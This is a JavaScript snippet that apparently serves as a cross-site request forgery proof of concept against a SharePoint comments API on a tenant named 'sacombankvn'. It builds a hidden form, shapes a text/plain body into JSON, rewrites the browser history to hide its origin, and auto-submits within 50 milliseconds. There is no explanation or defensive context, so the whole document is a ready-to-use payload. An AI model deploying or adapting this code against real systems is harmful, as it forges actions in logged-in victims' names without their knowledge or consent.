(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
  const AUTO_SUBMIT = true;

  const form = document.createElement('form');
  form.action = ACTION_URL;
  form.method = 'POST';
  form.enctype = 'text/plain';

  const hidden = document.createElement('input');
  hidden.type = 'hidden';
  hidden.name = '{"text":"----------","mentions":[]}';
  hidden.value = '';
  form.appendChild(hidden);

  const submit = document.createElement('input');
  submit.type = 'submit';
  submit.value = 'Submit request';
  form.appendChild(submit);

  document.body.appendChild(form);

  history.pushState('', '', '/');

  if (AUTO_SUBMIT) {
    setTimeout(()=> { try { form.submit(); } catch(e) { console.error(e); } }, 50);
  }
})();
